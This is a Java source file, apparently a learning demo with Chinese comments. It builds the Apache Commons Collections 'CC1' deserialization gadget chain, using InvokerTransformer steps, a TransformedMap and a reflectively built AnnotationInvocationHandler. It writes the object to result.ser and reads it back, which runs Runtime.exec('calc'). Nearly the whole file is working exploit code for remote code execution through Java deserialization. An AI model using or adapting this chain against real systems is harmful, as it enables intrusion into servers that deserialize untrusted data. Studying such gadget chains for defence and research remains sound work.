package org.example.cc;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
public class Cc1Demo1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                // 包装对象
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null,}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null,}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        map.put("value", "xxxx");
        Map decorate = TransformedMap.decorate(map, null, chainedTransformer);



        // 'sun.reflect.annotation.AnnotationInvocationHandler' 在 'sun.reflect.annotation' 中不为 public。
        // 我们不能直接创建对象，需要利用反射获得对象
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        /**
         * Class类的getConstructor()方法,无论是否设置setAccessible(),都不可获取到类的私有构造器.
         * Class类的getDeclaredConstructor()方法,可获取到类的私有构造器(包括带有其他修饰符的构造器），但在使用private的构造器时，必须设置setAccessible()为true,才可以获取并操作该Constructor对象。
         */
        Object o = declaredConstructor.newInstance(Retention.class, decorate);
        // 序列化对象
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File("result.ser")));
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
        // 反序列化对象
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File("result.ser")));
        objectInputStream.readObject();
        objectInputStream.close();
    }
}
